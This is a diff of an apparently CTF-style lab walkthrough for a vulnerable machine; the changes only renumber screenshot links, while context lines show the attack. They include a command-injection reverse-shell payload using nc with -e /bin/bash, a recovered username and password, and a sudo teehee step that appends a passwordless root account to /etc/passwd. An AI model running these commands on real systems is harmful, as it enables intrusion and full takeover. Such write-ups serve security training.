@@ -6,7 +6,7 @@ nmap enumeration
 
 directory discovery
 
-![](../.gitbook/assets/image%20%2811%29.png)
+![](../.gitbook/assets/image%20%2814%29.png)
 
 we have a login page in /login.php
 
@@ -40,11 +40,11 @@ change the ls command to this:
 nc+192.168.56.1+6666+-e+/bin/bash
 ```
 
-![](../.gitbook/assets/image%20%288%29.png)
+![](../.gitbook/assets/image%20%2811%29.png)
 
 run a listener and get a shell:
 
-![](../.gitbook/assets/image%20%283%29.png)
+![](../.gitbook/assets/image%20%2810%29.png)
 
 ![](../.gitbook/assets/image%20%2819%29.png)
 
@@ -62,25 +62,25 @@ username: jim
 
  passsword: jibril04
 
-![](../.gitbook/assets/image%20%2820%29.png)
+![](../.gitbook/assets/image%20%2823%29.png)
 
-![](../.gitbook/assets/image%20%2817%29.png)
+![](../.gitbook/assets/image%20%2820%29.png)
 
 nothing comes out of these files
 
 lets look for other vectors:
 
-![](../.gitbook/assets/image%20%2810%29.png)
+![](../.gitbook/assets/image%20%2813%29.png)
 
 no useful suid/sgid files
 
 
 
-![](../.gitbook/assets/image%20%2814%29.png)
+![](../.gitbook/assets/image%20%2817%29.png)
 
 no cron jobs
 
-![](../.gitbook/assets/image%20%2818%29.png)
+![](../.gitbook/assets/image%20%2821%29.png)
 
 lets check the mails:
 
@@ -90,7 +90,7 @@ cat /var/mail/jim
 
 login to charles:
 
-![](../.gitbook/assets/image%20%2821%29.png)
+![](../.gitbook/assets/image%20%2824%29.png)
 
 here we have sudo access:
 
@@ -100,7 +100,7 @@ here we have sudo access:
 
 we can run a binary named teehee without password
 
-![](../.gitbook/assets/image%20%2816%29.png)
+![](../.gitbook/assets/image%20%2818%29.png)
 
 it says that it can:
 
@@ -116,7 +116,7 @@ echo "root2::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
 
 su root2
 
-![](../.gitbook/assets/image%20%2813%29.png)
+![](../.gitbook/assets/image%20%2816%29.png)
 
 done !
 
